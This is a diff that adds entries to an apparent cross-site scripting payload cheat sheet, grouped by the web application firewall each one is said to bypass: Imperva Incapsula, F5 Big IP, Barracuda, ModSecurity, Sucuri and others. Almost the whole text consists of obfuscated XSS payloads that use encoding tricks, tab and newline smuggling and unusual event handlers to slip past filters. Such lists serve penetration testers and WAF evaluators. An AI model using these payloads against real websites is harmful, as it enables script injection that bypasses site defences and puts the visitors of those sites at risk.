@@ -91,3 +91,40 @@ ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%25
 Wordfence 7.4.2
 <a href=&#01javascript:alert(1)> -@brutelogic
 <a/href=%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x0a;:alert(1)>please%20click%20here</a>
+
+## Imperva Incapsula:
+%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
+<img/src="x"/onerror="[JS-F**K Payload]">
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\ert\`1\``'>
+
+##WebKnight
+<details ontoggle=alert(1)>
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+
+## F5 Big IP
+<body style="height:1000px" onwheel="[DATA]">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
+<body style="height:1000px" onwheel="[JS-F**k Payload]">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
+<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
+
+## Barracuda WAF
+<body style="height:1000px" onwheel="alert(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+
+## PHP-IDS
+<svg+onload=+"[DATA]"
+<svg+onload=+"aler%25%37%34(1)"
+
+## Mod-Security
+<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
+1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
+<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
+
+## Quick Defense
+<input type="search" onsearch="aler\u0074(1)">
+<details ontoggle="aler\u0074(1)">
+
+## Sucuri WAF
+1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
